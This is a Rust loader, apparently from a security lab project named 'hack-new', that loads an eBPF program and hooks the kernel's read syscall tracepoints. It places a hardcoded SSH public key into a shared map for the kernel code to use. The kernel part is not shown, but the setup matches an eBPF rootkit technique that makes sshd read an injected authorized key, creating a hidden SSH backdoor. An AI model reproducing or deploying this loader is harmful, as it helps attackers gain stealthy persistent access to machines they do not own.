use std::borrow::BorrowMut;

use aya::{include_bytes_aligned, maps::Array, programs::trace_point::TracePoint, Ebpf};
use aya_log::EbpfLogger;
use log::{debug, info, warn};
use tokio::signal;

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    env_logger::init();

    // Bump the memlock rlimit. This is needed for older kernels that don't use the
    // new memcg based accounting, see https://lwn.net/Articles/837122/
    let rlim = libc::rlimit {
        rlim_cur: libc::RLIM_INFINITY,
        rlim_max: libc::RLIM_INFINITY,
    };
    let ret = unsafe { libc::setrlimit(libc::RLIMIT_MEMLOCK, &rlim) };
    if ret != 0 {
        debug!("remove limit on locked memory failed, ret is: {}", ret);
    }

    // This will include your eBPF object file as raw bytes at compile-time and load it at
    // runtime. This approach is recommended for most real-world use cases. If you would
    // like to specify the eBPF program at runtime rather than at compile-time, you can
    // reach for `Bpf::load_file` instead.
    #[cfg(debug_assertions)]
    let mut bpf = Ebpf::load(include_bytes_aligned!(
        "../../target/bpfel-unknown-none/debug/hack-new"
    ))?;
    #[cfg(not(debug_assertions))]
    let mut bpf = Ebpf::load(include_bytes_aligned!(
        "../../target/bpfel-unknown-none/release/hack-new"
    ))?;
    if let Err(e) = EbpfLogger::init(&mut bpf) {
        // This can happen if you remove all log statements from your eBPF program.
        warn!("failed to initialize eBPF logger: {}", e);
    }

    let pub_key = b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCB+4dWCiR08aJcJFrVxX4eFlxs5+3JFI8J9+hiPjIk54tnlEd9cUjJznWNWdtNiP8mZKPOQucA52pmfqXXiKzNwf5KbGDrX9Q/kCgVJwe/vri6QGTIklTLMCKxX7IAqACrJXgQ1dkVeKWzNhRT/CVn7tngfxPpDhUN0mAzB3MAgk+xQHkz2xEKfYOT47Zhji4CbZKYrPzK0GVvLbxUNHfHa3z7vpfgso2BT3ODTv7KFa6uW1Faumf9sT4WLLL0MSGHTdbuFpqFDEGswAl/NlehSD5P5sK33QL9n+oeLNksx0SyNNSBFpfRqcn9AJWIJOdDJiAT2CJ02rbXQoBtao7W3McVyCRyxpAkr0/5gAOK3bVrs6cQh1/+fsdHWDBEe/SReFlHGBsOf6P9AWRkWIlPcVGlaeTxkKVXeEYmcJLeEsVE5+q8bkVfIeL+LQL1nBuWZl5SuSmbOpzYcpRw2VzczLDQSPdC1UL9V59enK64ALBPxakOYCRqLCWq+RODpsM= oslab@rust\n";
    let mut string_array: Array<&mut aya::maps::MapData, [u8; 740]> =
        Array::try_from(bpf.map_mut("string_array").unwrap())?;

    string_array.borrow_mut().set(0, pub_key, 0)?;

    let sys_enter_read_point: &mut TracePoint = bpf
        .program_mut("tracepoint_sys_enter_read")
        .unwrap()
        .try_into()?;
    sys_enter_read_point.load()?;
    sys_enter_read_point.attach("syscalls", "sys_enter_read")?;

    let sys_enter_read_point: &mut TracePoint = bpf
        .program_mut("tracepoint_sys_exit_read")
        .unwrap()
        .try_into()?;
    sys_enter_read_point.load()?;
    sys_enter_read_point.attach("syscalls", "sys_exit_read")?;

    info!("Waiting for Ctrl-C...");
    signal::ctrl_c().await?;
    info!("Exiting...");

    Ok(())
}
